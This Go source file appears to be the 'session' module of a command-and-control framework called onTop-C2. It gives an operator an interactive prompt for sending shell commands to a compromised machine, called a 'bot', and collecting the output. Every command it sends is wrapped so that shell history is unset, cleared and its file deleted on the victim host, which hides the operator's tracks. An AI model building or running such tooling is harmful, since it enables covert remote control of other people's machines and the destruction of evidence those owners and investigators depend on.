package modules

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"io"

	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"

	"github.com/chzyer/readline"
)

var session types.Module = types.Module{
	Name:        "session",
	Description: "Interact with a session (bot)",
	Parallel:    false,
	Options:     sessionOptions,
	Execute:     InteractWithSession,
}

var sessionOptions map[string]*types.Option = map[string]*types.Option{
	"BOT": {
		Name:        "BOT",
		Description: "The target bot-id to handle interaction",
		Required:    true,
		Value:       nil,
	},
}

var interruptChannel chan struct{} = make(chan struct{})
func InteractWithSession(options map[string]*types.Option) {
	idOption, ok := options["BOT"]
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "BOT"), true)
		return

	}

	sessionID, ok := idOption.Value.(string)
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid sessionID str (bot-00000)\n", idOption.Name), true)
		return

	}

	var session *ListenerSession
	var exists bool

	session, exists = Sessions[sessionID]

	if !exists {
		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found session with id", sessionID), true)
		return

	}

	newErr := misc.ForceClearStdout()
	if newErr != nil {
		misc.PanicWarn(fmt.Sprintf("An error ocurred during stdout forced clear: %v", newErr), false)
		return

	}

	botIP, _ := misc.Colors(session.BotIP, "red")
	promptSignal, _ := misc.Colors("▶▶", "white_bold")
	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"
	prompt := fmt.Sprintf("%v %v ", botIP, promptSignal)
	signal.Stop(misc.InterruptSigs)
	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)

	misc.PrintBanner()
	misc.ChanInterruptHandler(interruptChannel)
	rl, ee := readline.New(prompt)
	if ee != nil {
		fmt.Println("Some error occurred during readline initialization: ", ee)
		os.Exit(0)

	}

	for {
		select {
		case <-interruptChannel:
			signal.Stop(misc.ChanInterruptSigs)
			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
			return

		default:
			l, err := rl.Readline()
			if err == readline.ErrInterrupt || err == io.EOF {
				return

			}

			userCommand := strings.TrimSpace(l)
			if userCommand == "" {
				continue

			}

			session.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)

			var fullResponse []string
			var finishedPrinting bool

			for !finishedPrinting {
				select {
				case output := <-session.Outputs:
					trimOutput := strings.TrimSpace(output)
					if trimOutput == endFromListener {
						finishedPrinting = true
						break

					}

					fullResponse = append(fullResponse, trimOutput)

				case <-time.After(25 * time.Second):
					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
					finishedPrinting = true

				}

			}

			if len(fullResponse) != 0 {
				fmt.Println(strings.Join(fullResponse, "\n"))

			}

			fmt.Print("\n")

		}

	}

}

func init() {
	RegisterNewModule(&session)

}
